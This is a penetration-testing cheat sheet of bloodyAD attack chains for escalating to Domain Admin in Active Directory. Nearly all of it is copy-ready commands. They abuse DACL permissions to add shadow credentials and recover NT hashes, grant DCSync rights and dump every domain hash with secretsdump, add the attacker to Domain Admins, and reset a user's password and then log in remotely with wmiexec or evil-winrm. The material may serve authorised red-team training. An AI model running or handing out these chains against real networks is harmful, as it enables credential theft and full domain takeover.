# 08.02 bloodyAD Common Attack Chains

> Chain `bloodyAD` primitives (DACL → membership → password reset → ticket) into ready-made paths to Domain Admin.

## Overview

Common exploitation chains combining bloodyAD primitives. Each chain starts from a specific DACL misconfiguration and escalates to Domain Admin or equivalent.

## Steps

- GenericWrite → Kerberoasting: set SPN → GetUserSPNs → crack → use new creds
- GenericWrite → Shadow Creds: add msDS-KeyCredentialLink → PKINIT → NT hash
- WriteOwner → FullControl → DCSync: owneredit → dacledit → secretsdump
- WriteDACL → DCSync: add dcsync ACE → secretsdump -just-dc
- GenericAll on group → add member → move laterally / escalate
- Always check get writable first to discover what the current user can attack

## Commands

### GenericWrite → Shadow Credentials → NT hash

```bash
# Confirm GenericWrite:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP get writable --otype user
# Add shadow creds:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add shadowCredentials targetuser
# Convert cert to TGT (PKINITtools):
python3 gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass '' DOMAIN/targetuser targetuser.ccache
export KRB5CCNAME=targetuser.ccache
# Get NT hash via getTGT + getnthash:
python3 getnthash.py DOMAIN/targetuser -key $(python3 gettgtpkinit.py ... 2>&1 | grep AS-REP | awk '{print $NF}')
```

### WriteDACL on domain root → DCSync

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add dcsync attacker
impacket-secretsdump DOMAIN/attacker:'P@ss'@DC_IP -just-dc
# Cleanup:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP remove dcsync attacker
```

### GenericAll on group → add self → privilege escalation

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add genericAll "Domain Admins" attacker
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add groupMember "Domain Admins" attacker
# Verify:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP get membership "Domain Admins"
```

### ForceChangePassword → lateral movement

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set password highvalueuser 'TempPass123!'
# Login:
impacket-wmiexec DOMAIN/highvalueuser:'TempPass123!'@TARGET_IP
# Or:
evil-winrm -i TARGET_IP -u highvalueuser -p 'TempPass123!'
```

### Full recon → attack flow

```bash
# 1. Discover what current user can write:
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get writable
# 2. If WriteMembers on privileged group:
bloodyAD -u user -p pass -d DOMAIN --host DC_IP add groupMember "Domain Admins" user
# 3. Re-auth and DCSync:
impacket-secretsdump DOMAIN/user:'P@ss'@DC_IP -just-dc
# Or add DCSync directly if WriteDACL on domain:
bloodyAD -u user -p pass -d DOMAIN --host DC_IP add dcsync user && impacket-secretsdump DOMAIN/user:pass@DC_IP -just-dc
```
